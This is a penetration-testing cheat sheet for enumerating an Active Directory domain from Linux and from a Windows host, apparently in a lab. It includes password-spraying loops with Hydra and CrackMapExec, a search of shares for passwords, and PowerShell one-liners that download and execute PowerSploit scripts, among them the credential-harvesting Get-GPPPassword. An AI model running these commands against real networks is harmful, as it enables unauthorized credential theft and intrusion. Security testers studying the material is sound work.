## Enumeration From Linux Machine

### Nmap
```
// Determine LDAP Service
nmap -Pn -sS -p389 --open -iL scope.txt

// SMB Service
nmap -Pn -sS -p139,445 --open -iL scope.txt

// SSH & Telnet
nmap -Pn -sS -p22,23 --open -iL scope.txt

// Web Services
nmap -Pn -sS -p80,443 --open -iL scope.txt

// SNMP Service
nmap -Pn -sU -p161,162 --open -iL scope.txt
```

### RPCclient
```
// Authenticate using username and password to domain Marvel
rpcclient -U "Marvel\hsaad%P@ssw0rd" 10.0.2.100

// Authenticate using Null Session
rpcclient -U "" -N 10.0.2.6

// Enumerate Domain Info
> enumdomains
> querydominfo
> srvinfo

// Enumerate Domain Users
> enumdomusers
> queryuser hsaad // OR through rid {0x501}

// Enumerate Password Policy
> getdompwinfo

// Enumerate Domain Groups
> enumdomgroups
> enumalsgroups domain
> querygroup 0x5a0a

// Enumerate Local Groups
> enumalsgroups builtin

// Enumerate Groups Members
> querygroupmem 0x5a0
> queryaliasmem builtin|domain 0x5a0

// Enumerate Users Groups
> queryusergroups 0x501

// Enumerate the members of administrators and RDP local groups
> queryaliasmem builtin 0x220 // Administrators group members
> queryaliasmem builtin 0x22b // Remote Desktop Users group members
```

### Find Open Shares
```
# Test Open Shares
smbclient -U "Marvel\hsaad%P@ssw0rd" -L 10.0.2.6

# Access Shares
smbclient -U "Marvel\hsaad%P@ssw0rd" \\\\172.31.2.112\\SYSVOL

# Script to Automate
for ip in $(cat ips.txt);do
(smbclient -U "Marvel\hsaad%P@ssw0rd" -L $ip | grep Disk | cut -d " " -f 1 | sed 's/\t//' | while read shares;do echo "\\\\\\\\$ip\\\\"$shares | tee -a shares.txt;done) & sleep 1
done
cat shares.txt | while read share;do
echo $share >> shares-files.txt
smbclient -U "Marvel\hsaad%P@ssw0rd" $share -c "dir" | tee -a shares-files.txt;
done
```

### Enum4Linux
```
enum4linux -u Marvel/hsaad -p P@ssw0rd -a 10.0.2.100 // enumerate all
enum4linux -u Marvel/hsaad -p P@ssw0rd -U 10.0.2.100 // enumerate users
enum4linux -u Marvel/hsaad -p P@ssw0rd -G 10.0.2.100 // enumerate groups
enum4linux -u Marvel/hsaad -p P@ssw0rd -P 10.0.2.100 // enumerate password policy
enum4linux -u Marvel/hsaad -p P@ssw0rd -S 10.0.2.100 // enumerate shares
enum4linux -a 10.0.2.100 // enumerate all using null session if exists
```

### CrackMapExec
```
# Find local admin on IP list based on username and password
for line in $(cat IP.txt);do
crackmapexec smb $line -d Marvel.local -u hsaad -p P@ssw0rd | tee -a crack.log & sleep 2;
done
```

### Hydra
```
# Find RDP access on IP list based on username and password
for line in $(cat IP.txt);do
hydra -l hsaad -p P@ssw0rd -m Marvel.local -t 1 $line rdp | tee -a hydra.log & sleep 2;
done
```

## Enumerations From Joined Domain Windows Machine

### Powerview
```
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1")

# Authentication
runas /netonly /user:mydomain\username powershell

# Domain Info
Get-Domain -Domain Marvel.local

# Root Domain
Get-DomainController -Domain Marvel.local | select forest,domain,name,osversion,ipaddress

# Child Domain
Get-DomainController -Domain Child.Marvel.local -DomainController 172.31.2.114 | select dnshostname,operatingsystem,serviceprincipalname

# Password Policy
(Get-DomainPolicy)."SystemAccess"

# Enumerate Domain Users
Get-DomainUser -Domain Marvel.local -DomainController 172.31.2.114 | select samaccountname 

# Enumerate Domain Users Properties
Get-DomainUser -Properties description,pwnlastset

# Get Detailed Information About Specific Domain User
Get-DomainUser -Identity user1

# Enumerate Domain Groups
Get-DomainGroup | select samaccountname

# Get Domain Groups That Contains The Word "admin".
Get-DomainGroup *admin* | select samaccountname

# Enumerate Domain Computers
Get-DomainComputer | select cn

# Emumerate Domain Computers That Respond To Ping Request
Get-DomainComputer -Ping | select cn

# Enumerate Domain OUs
Get-DomainOU | select name

# Enumerate Domain Group Members
Get-DomainGroupMember -Identity "Domain Admins"

# Enumerate Nested Group Members (Recursive)
Get-DomainGroupMember -Identity "Domain Admins" -RecurseUsingMatchingRule | select groupname,membername,memberobjectclass 

# Enumerate User Groups
Get-DomainGroup -UserName 'hsaad' | select samaccountname,memberof

# Enumerate Local Groups on Computer Spiderman
Get-NetLocalGroup –ComputerName SPIDERMAN

# Enumerate Local Group Members Of Administrators Group on Computer Spiderman
Get-NetLocalGroupMember -ComputerName spiderman -GroupName "administrators"

# Enumerate Local Group Members Of Remote Desktop Users Group on Computer Spiderman
Get-NetLocalGroupMember -ComputerName spiderman -GroupName "remote desktop users"

# Enumerate Open Shares
Get-NetShare -ComputerName SPIDERMAN

# Search on Keyword Inside Files
findstr /spin /c:"password" \\share_name\*

# Find Interesting Files Using Powerview
Find-InterestingDomainShareFile -Path \\share_name\*

# View the following link for more information on how the process of users sessions enumeration working:
# https://www.youtube.com/watch?v=q86VgM2Tafc
# Enumerate Users Sessions on every computer in the domain
Get-NetSession -ComputerName SPIDERMAN

# Exploiting Group Policy Preferences: https://adsecurity.org/?p=2288
# Domain GPP Leaked Credentials
IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1")
Get-GPPPassword

# Enumerate Local Admin Users in all computers in the domain.
# Returns all GPOs in the domain that modify the local group memberships
Get-DomainGPOLocalGroup
# Enumerate if this policy applies on this computer
Get-DomainGPO -ComputerIdentity Spiderman | ? {$_.displayname -match 'Add Local Admin Access'}

# Enumerate the Interesting ACL in the domain
Find-InterestingDomainAcl -ResolveGUIDs

# Enumerate the ACLs that applied to the user pparker
Get-DomainObjectAcl -Identity pparker -ResolveGUIDs

# Enumerate the ACLs on the same user and filter the result
Get-DomainObjectAcl -Identity pparker -ResolveGUIDs | % { echo $_.ActiveDirectoryRights,$_.ObjectAceType; Convert-ADName $_.SecurityIdentifier; echo "" } 

# Search on Specific ACL
Get-DomainObjectAcl -Identity pparker,hsaad -Domain Marvel.local -DomainController 172.31.2.112 | ? {$_.SecurityIdentifier -match "S-1-1-0"}
```

## BloodHound

You can collect plenty of data with SharpHound by simply running the binary itself with no flags set:
```
C:\> SharpHound.exe
```

SharpHound will automatically determine what domain your current user belongs to, find a domain controller for that domain, and start the “default” collection method. The default collection method will collect the following pieces of information from the domain controller:
- Security group memberships
- Domain trusts
- Abusable rights on Active Directory objects
- Group Policy links
- OU tree structure
- Several properties from computer, group and user objects
- SQL admin links

Additionally, SharpHound will attempt to collect the following information from each domain-joined Windows computer:
- The members of the local administrators, remote desktop, distributed COM, and remote management groups
- Active sessions, which SharpHound will attempt to correlate to systems where users are interactively logged on

When finished, SharpHound will create several JSON files and place them into a zip file. Drag and drop that zip file into the BloodHound GUI and the interface will take care of merging the data into the database.
